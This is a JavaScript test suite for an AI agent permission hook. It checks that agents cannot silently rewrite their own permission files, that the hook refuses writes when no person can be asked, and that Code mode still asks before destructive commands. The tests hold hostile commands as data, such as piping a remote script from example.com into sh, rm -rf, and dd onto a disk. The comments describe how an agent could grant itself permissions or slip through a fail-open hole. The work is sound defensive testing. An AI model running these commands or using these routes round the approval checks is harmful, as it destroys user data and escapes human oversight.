      'a block written before this change is ours, not the person\'s, so it is safe to rewrite');
  });
});

describe('the card for the permission file says what the file is', () => {
  const home = os.homedir();

  test('its copy names what the file governs and that the asking cannot be switched off', () => {
    // A card that reads like an ordinary config write gets answered like one,
    // and this is the write that decides what gets asked about at all.
    const copy = permissions.alwaysAskCopy({ answerFile: true });
    assert.ok(copy, 'an answer-file crossing gets copy of its own');
    assert.ok(copy.includes('what agents may do'), 'it says what the file governs');
    assert.ok(copy.includes('every time'), 'and that this one keeps asking');
    assert.strictEqual(permissions.alwaysAskCopy({ secret: true, answerFile: true }),
      permissions.alwaysAskCopy({ secret: true }),
      'a credential still outranks it when a crossing is somehow both');
    assert.strictEqual(permissions.alwaysAskCopy({}), null,
      'and an ordinary crossing still renders the card unchanged');
  });

  test('the flag reaches the card whichever grader caught the write', () => {
    // The shell path tagged its crossings and the file-tool path dropped the
    // flag, so the same file could be described one way when a command wrote
    // it and another when a tool did. The tool route is the direct one.
    const ws = tmp('wb-selfgrant-flag-');
    const target = path.join(ws, '.claude', 'settings.local.json');
    const viaTool = hook.classifyFileAccess('Write', { file_path: target }, ws, [], home);
    // The two graders now reach the card by different roads, and the guarantee
    // is that both arrive worded as an answer file with nothing grantable.
    //
    // The tool route no longer reports a boundary crossing, because the file is
    // not outside and saying so put a false heading on the card. It carries the
    // reason on the access itself, which the payload forwards as `answer_file`.
    assert.strictEqual(viaTool.answerFile, true,
      'the tool route carries the tag the card is worded from');
    assert.strictEqual(viaTool.grantDir, null,
      'and nothing a standing grant could be built from');
    assert.deepStrictEqual(hook.boundaryCrossingsFor(viaTool), [],
      'and it claims no crossing, because none happened');

    const viaShell = hook.classifyShellAccess('Bash', { command: `echo '{}' > ${target}` }, ws, [], home, false);
    assert.ok(hook.boundaryCrossingsFor(viaShell).some(c => c.answerFile),
      'and the shell route says the same thing about the same file');
  });
});

describe('an existing workspace is actually upgraded, not merely recognised', () => {
  test('reconciling a block written before this change rewrites it to include the new deny', () => {
    // Recognition is half the job. A block can be correctly identified as ours
    // and still be left on disk missing the protection, which would mean every
    // workspace that already exists never gets it.
    const ws = tmp('wb-selfgrant-reconcile-');
    const home = os.homedir();
    const older = releasedBlock(2, ws, home, scaffold.tempRoots(), 'on');

    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    const settingsPath = path.join(ws, '.claude', 'settings.local.json');
    fs.writeFileSync(settingsPath, JSON.stringify({ sandbox: older }, null, 2));

    scaffold.reconcileSandboxForMode(ws, 'knowledge', 'darwin');

    const after = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
    const denyAfter = (after.sandbox && after.sandbox.filesystem && after.sandbox.filesystem.denyWrite) || [];
    assert.ok(denyAfter.some(p => p.endsWith('.claude/settings.local.json')),
      'the workspace that already existed now has the protection too, on disk');
  });
});

describe('no grant already stored can answer for the permission file', () => {
  test('a standing grant over a parent of the workspace does not cover it', () => {
    // SUPPRESSING THE OFFER IS NOT ENOUGH ON ITS OWN. A card that offers no
    // folder stops a NEW grant being made; it says nothing about a grant made
    // earlier for an unrelated reason. Granting a parent of one's workspace is
    // an ordinary thing to do, and a stored grant covers its whole subtree, so
    // without this the earlier grant would answer for the mechanism that
    // records the answers.
    //
    // The coverage check recomputes this from the registry and the current
    // workspace rather than trusting a flag off the wire, so naming the file in
    // the registry extended the check as well. Pinned here because that is a
    // property of the design, not an accident, and nothing else asserts it.
    const ws = tmp('wb-selfgrant-covered-');
    const original = config.getWorkspace();
    try {
      config.setWorkspace(ws);
      const target = path.join(ws, '.claude', 'settings.local.json');
      boundary.addBoundaryGrant(path.dirname(ws));
      assert.strictEqual(boundary.boundaryGrantCovers(target), true,
        'sanity: a grant over the parent does cover this path by the ordinary prefix rule');
      assert.strictEqual(boundary.crossingCovered({ path: target }), false,
        'and the decision that matters still refuses to treat it as answered');
    } finally {
      config.setWorkspace(original);
    }
  });
});

// CODE MODE MUST NOT SWALLOW A WRITE TO THE WORKSPACE'S OWN ANSWER FILES.
//
// This is the trap that made the misleading card worth keeping until it was
// understood. The classification was 'outside' not merely because that forced a
// card, but because code mode auto-approves everything EXCEPT 'outside'. So
// reclassifying the file by where it actually sits, without touching this
// branch, would have silently removed the card in code mode: an agent could
// then rewrite the allow-list unprompted and hold every permission for this
// session and every later one.
//
// Driven through the real hook process rather than a helper, because the branch
// is inline in main() and a unit-level stand-in would be asserting on something
// other than the thing that decides.
// A PORT NOTHING IS LISTENING ON, and every test that arms the real hook must
// name it.
//
// `permission-hook.js` reads `process.env.RUNDOCK_PORT || 3000`. A test that
// sets RUNDOCK=1 without setting the port therefore POSTs its fabricated
// request to whatever is serving 3000, and in development that is the author's
// own Rundock. Reported from the field as a permission storm arriving in a live
// conversation with no agent behind it: eleven cards naming temp directories
// with this file's own fixture prefixes (`answerfile-`, `guarded-`), raised by
// `npm test` running in another terminal.
//
// The card is not merely noise. It carries no conversation id, so it lands in
// whatever conversation the reader has open, and it asks them to approve a
// change to a permissions file in a directory they have never heard of. A
// person trained to click through those is a person who will click through the
// real one.
//
// Port 1 refuses immediately rather than hanging: these tests are about the
// decision the hook reaches BEFORE any HTTP call, and a request that gets as
// far as the socket has already proven it was not auto-approved.
const CLOSED_PORT = '1';

describe('code mode and the answer files', () => {
  const { spawnSync } = require('node:child_process');
  const HOOK = require.resolve('../../scripts/permission-hook.js');

  // The workspace is made FIRST and the path is built from it, because the
  // first version of this helper made a fresh workspace per call and the test
  // then passed a path belonging to a different one. That path was genuinely
  // outside, so it was not auto-allowed and the assertion passed while the
  // regression it existed to catch shipped underneath it.
  function decideIn(ws, relPath, toolName, codeMode) {
    const env = { ...process.env, RUNDOCK: '1', RUNDOCK_WORKSPACE: ws, RUNDOCK_PORT: CLOSED_PORT };
    if (codeMode) env.RUNDOCK_CODE_MODE = '1';
    const r = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({
        tool_name: toolName,
        tool_input: { file_path: path.join(ws, ...relPath.split('/')) },
        session_id: 's',
      }),
      env, encoding: 'utf-8', timeout: 10000,
    });
    return r.stdout || '';
  }

  function workspace() {
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'answerfile-'));
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    return ws;
  }

  // The instant-allow for in-workspace file access fires in EVERY mode, before
  // the code-mode branch, so reclassifying these files by where they sit
  // removed the card completely rather than only in code mode.
  for (const mode of [false, true]) {
    const label = mode ? 'code mode' : 'knowledge mode';
    for (const f of ['.claude/settings.local.json', '.rundock/state.json', '.rundock/permissions.json']) {
      test(`writing ${f} is not auto-allowed in ${label}`, () => {
        const ws = workspace();
        const out = decideIn(ws, f, 'Write', mode);
        assert.doesNotMatch(out, /"permissionDecision":"allow"/,
          `${label} must not silently approve a change to what agents are allowed to do`);
      });
    }
  }

  test('the guard is about the file, not the tool: Edit is caught too', () => {
    const ws = workspace();
    assert.doesNotMatch(decideIn(ws, '.claude/settings.local.json', 'Edit', false),
      /"permissionDecision":"allow"/);
  });

  test('and reading one is still allowed outright', () => {
    const ws = workspace();
    assert.match(decideIn(ws, '.claude/settings.local.json', 'Read', false),
      /"permissionDecision":"allow"/,
      'reads were always free and this change must not start carding them');
  });

  // The other half of the guard: the branch must still do its job. Exercised
  // with a COMMAND, which is what code mode exists to auto-approve; an ordinary
  // in-workspace file write is allowed by an earlier branch and never reaches it.
  test('an ordinary command IS still auto-approved in code mode, unchanged', () => {
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'answerfile-'));
    const r = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'npm test' }, session_id: 's' }),
      env: { ...process.env, RUNDOCK: '1', RUNDOCK_WORKSPACE: ws, RUNDOCK_CODE_MODE: '1', RUNDOCK_PORT: CLOSED_PORT },
      encoding: 'utf-8',
    });
    assert.match(r.stdout || '', /Auto-approved: workspace is in Code mode/,
      'code mode still does what it is for: this change must not narrow it');
  });
});

// THE ANSWER FILES SPLIT BY WHO GUARDS THEM, which was measured against the
// real runtime rather than reasoned about.
//
// `.claude/settings.local.json` is the settings file Rundock launches the
// runtime with. The runtime refuses every write to it: under acceptEdits,
// through a file tool and through a shell redirect, and no permission rule
// inside that file unlocks it, not even `Edit(**)`. So an Allow there cannot be
// honoured, and a user met exactly that: card shown, approval recorded,
// write refused, agent reporting "not approved".
//
// The two `.rundock/` files have no such floor. An agent edits them freely and
// readToolAllows trusts whatever strings it finds, so a write is a grant of
// standing permissions nobody issued. THE CARD IS THE ONLY PROTECTION THEY
// HAVE, which is why the two sets must never be collapsed back together.
describe('answer files split by who guards them', () => {
  const { spawnSync } = require('node:child_process');
  const HOOK = require.resolve('../../scripts/permission-hook.js');

  function outcome(rel, toolName, codeMode) {
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'guarded-'));
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    const env = { ...process.env, RUNDOCK: '1', RUNDOCK_WORKSPACE: ws, RUNDOCK_PORT: CLOSED_PORT };
    if (codeMode) env.RUNDOCK_CODE_MODE = '1';
    const r = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({
        tool_name: toolName,
        tool_input: { file_path: path.join(ws, ...rel.split('/')) },
        session_id: 's',
      }),
      env, encoding: 'utf-8', timeout: 10000,
    });
    const out = r.stdout || '';
    if (/"permissionDecision":"deny"/.test(out)) return { kind: 'deny', out };
    if (/"permissionDecision":"allow"/.test(out)) return { kind: 'allow', out };
    return { kind: 'ask', out };
  }

  for (const codeMode of [false, true]) {
    const label = codeMode ? 'code mode' : 'knowledge mode';

    test(`the runtime-guarded settings file is refused, not asked about (${label})`, () => {
      const r = outcome('.claude/settings.local.json', 'Write', codeMode);
      assert.strictEqual(r.kind, 'deny',
        'an Allow here could never be honoured, so it must not be offered');
      assert.match(r.out, /refuses every write|permission rules themselves/,
        'and the refusal says why, because silence would read as permission');
    });

    // ASSERTED AS "NEVER ALLOWED", not as "asks", because those differ by
    // something outside the test: with Rundock running the write goes to a
    // card, and without it the hook now refuses, since the card that is this
    // file's only protection cannot be shown. Both are the guarantee. An
    // earlier version asserted 'ask' and passed only because a development
    // server happened to be listening; it failed the moment the port was free,
    // which is how the fail-open hole was found.
    test(`Rundock's own permission store is never silently allowed (${label})`, () => {
      for (const f of ['.rundock/permissions.json', '.rundock/state.json']) {
        assert.notStrictEqual(outcome(f, 'Write', codeMode).kind, 'allow',
          `${f}: nothing else guards this file, so it must never be written unprompted`);
      }
    });
  }

  test('reading the guarded settings file is still free', () => {
    assert.strictEqual(outcome('.claude/settings.local.json', 'Read', false).kind, 'allow');
  });

  test('an ordinary workspace file is untouched by the split', () => {
    assert.strictEqual(outcome('notes.md', 'Write', false).kind, 'allow');
  });
});

// WHEN NOBODY CAN BE ASKED, THE ANSWER FILES ARE STILL NOT CHANGED.
//
// The card is the ONLY guard on `.rundock/state.json` and
// `.rundock/permissions.json`: no sandbox rule covers them, the runtime does not
// refuse them, and readToolAllows trusts whatever strings it finds. So "the
// server is unreachable" must not mean "go ahead". It did, until this.
//
// The hole survived a suite that covered these files well, because those tests
// spawned the hook with no port pinned and so reached a real Rundock on 3000.
// They were measuring a developer's browser. Pointed at a closed port, they
// failed immediately. A guard that has only ever been exercised with the server
// up has not been exercised at the moment it exists for.
describe('the server cannot be reached, and the answer files hold anyway', () => {
  const { spawnSync } = require('node:child_process');
  const HOOK = require.resolve('../../scripts/permission-hook.js');

  function decideWithNoServer(rel, toolName, codeMode) {
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'noserver-'));
    fs.mkdirSync(path.join(ws, '.claude'), { recursive: true });
    fs.mkdirSync(path.join(ws, '.rundock'), { recursive: true });
    const env = { ...process.env, RUNDOCK: '1', RUNDOCK_WORKSPACE: ws, RUNDOCK_PORT: CLOSED_PORT };
    if (codeMode) env.RUNDOCK_CODE_MODE = '1';
    const r = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({
        tool_name: toolName,
        tool_input: { file_path: path.join(ws, ...rel.split('/')) },
        session_id: 's',
      }),
      env, encoding: 'utf-8', timeout: 10000,
    });
    return r.stdout || '';
  }

  for (const mode of [false, true]) {
    const label = mode ? 'code mode' : 'knowledge mode';
    for (const f of ['.rundock/state.json', '.rundock/permissions.json']) {
      test(`${f} is refused, not approved, with no server to ask (${label})`, () => {
        const out = decideWithNoServer(f, 'Write', mode);
        assert.match(out, /"permissionDecision":"deny"/,
          'the card is the only guard on this file, so an unreachable server cannot become a yes');
        assert.match(out, /never changed without asking/,
          'and the agent is told why, so it does not read as an unexplained failure');
      });
    }
  }

  test('ordinary work still proceeds when the server is down', () => {
    // The other half, and the reason this is not simply "deny everything".
    // Ordinary access keeps the sandbox and the runtime's guards beneath it, so
    // stopping a person's work because a local web server died would protect
    // nothing and cost everything.
    const out = decideWithNoServer('notes.md', 'Write', false);
    assert.match(out, /"permissionDecision":"allow"/,
      'a dead server must not become a work stoppage for access that has a floor under it');
  });
});

// CODE MODE TRUSTS YOU WITH YOUR CODE, NOT WITH AN IRREVERSIBLE ACT.
//
// The Code mode branch approved anything that was not outside the workspace and
// not an answer file. So `rm -rf` inside the workspace, or inside any named
// working folder, ran with no card drawn and no decision recorded, while the
// card grader in public/permissions.js graded that same text high risk, ready
// to paint a card the decider had already chosen not to raise. The product
// looked careful about a class of command it was waving through.
//
// This matters more since Code mode began switching the OS sandbox off: there
// is no floor under the command, so the card is the only thing between it and
// the disk. A repository is recoverable in a way a deleted folder is not.
describe('Code mode does not auto-approve a destructive command', () => {
  const { spawnSync } = require('node:child_process');
  const HOOK = require.resolve('../../scripts/permission-hook.js');

  // THE FIXTURE IS A REAL PLACE WITH REAL TARGETS. The workspace sits outside
  // every temp folder where one is available (in Code mode the temp folders are
  // development paths, though never for the workspace itself), and every
  // target a command names exists: a delete of nothing deletes nothing, and
  // runs.
  const outside = require('../helpers/code-mode-fixture.js').outsideTempRoot();
  const fixtureBase = outside.dir || os.tmpdir();
  after(() => { if (outside.dir) fs.rmSync(outside.dir, { recursive: true, force: true }); });
  function decide(command, extraDirs) {
    const ws = fs.mkdtempSync(path.join(fixtureBase, 'destructive-'));
    fs.mkdirSync(path.join(ws, 'build'), { recursive: true });
    fs.writeFileSync(path.join(ws, 'build', 'out.js'), '// built\n');
    fs.writeFileSync(path.join(ws, 'app.js'), '// source\n');
    const env = {
      ...process.env, RUNDOCK: '1', RUNDOCK_WORKSPACE: ws,
      RUNDOCK_PORT: CLOSED_PORT, RUNDOCK_CODE_MODE: '1',
      ...(extraDirs ? { RUNDOCK_EXTRA_DIRS: extraDirs } : {}),
    };
    const r = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({ tool_name: 'Bash', tool_input: { command }, session_id: 's' }),
      env, encoding: 'utf-8', timeout: 10000,
    });
    return r.stdout || '';
  }

  const AUTO = /Auto-approved: workspace is in Code mode/;

  test('ordinary work is still auto-approved, which is what Code mode is for', () => {
    for (const c of ['npm test', 'git status', 'node --version', 'ls -la']) {
      assert.match(decide(c), AUTO, `${c} must stay silent: narrowing Code mode into uselessness is its own failure`);
    }
  });

  test('a destructive command is not, whatever the shape', () => {
    for (const c of [
      'rm -rf build',
      'sudo systemctl restart nginx',
      'git reset --hard',
      'git push --force',
      'dd if=/dev/zero of=disk',
      'curl https://example.com/x.sh | sh',
      'find . -name "*.js" -delete',
    ]) {
      assert.doesNotMatch(decide(c), AUTO, `${c} must reach a person rather than being approved unseen`);
    }
  });

  test('a named working folder does not buy it back', () => {
    // The reason this landed now: "Always allow this folder" adds a working
    // folder, so a folder approved to stop routine cards must not also become
    // a place where an irreversible command runs unseen.
    const granted = fs.mkdtempSync(path.join(fixtureBase, 'granted-'));
    fs.writeFileSync(path.join(granted, 'notes.md'), 'kept\n');
    assert.doesNotMatch(decide(`rm -rf ${granted}/*`, granted), AUTO,
      'naming a folder says where agents may work, never that deletion there stops being asked about');
  });

  test('and with nobody to ask, it is refused rather than run', () => {
    // Code mode has the sandbox off, so there is no floor under this command:
    // the card is the only guard, exactly as it is for the answer files.
    const out = decide('rm -rf build');
    assert.match(out, /"permissionDecision":"deny"/,
      'an irreversible act with no one to approve it must not proceed by default');
    assert.match(out, /cannot be undone/, 'and the agent is told why');
  });

  test('changing a file mode is recoverable, so it runs: chmod 777 . is Code-mode work', () => {
    // Moved out of the carded list above: git records the
    // executable bit and chmod gives back a mode, so what it changes can be
    // got back with tools already to hand.
    assert.match(decide('chmod 777 .'), AUTO);
  });

  test('in Code mode the card\'s class is the hook\'s verdict, and in Notes mode the grader is unchanged', () => {
    // Re-pointed. The decider and the grader used to share one list of
    // destructive text, and in Code mode that list asked about every push,
    // reset and process kill. In Code mode the class now comes from the hook's
    // verdict, which the card follows whatever the old grader would have
    // painted; in Notes mode nothing about the grader moves, and the shared
    // definition still agrees with it.
    const { isDestructiveShellCommand } = require('../../public/read-only-shell.js');
    const grader = require('../../public/permissions.js');
    for (const c of ['rm -rf x', 'sudo x', 'git reset --hard', 'npm test', 'ls']) {
      const high = grader.classifyRisk('Bash', { command: c }) === 'high';
      assert.strictEqual(isDestructiveShellCommand(c), high,
        `${c}: in Notes mode the shared test and the card grader still agree`);
    }
    const runs = { verdict: 'runs' };
    const always = { verdict: 'always-asks', reason: 'unsaved-work', files: [], more: 0 };
    assert.strictEqual(grader.classifyRisk('Bash', { command: 'kill 4242' }), 'high', 'precondition: the old grader paints a process kill high');
    assert.strictEqual(grader.decidePermission('high', 'Bash:kill', new Set(), runs).action, 'allow', 'a kill the hook judged Runs is not carded');
    assert.strictEqual(grader.decidePermission('low', 'Bash:ls', new Set(['Bash:ls']), always).action, 'card', 'and an Always-asks verdict is carded whatever the grader thought');
    assert.match(decide('kill 4242'), AUTO, 'the hook itself no longer reads the destructive list in Code mode');
  });
});
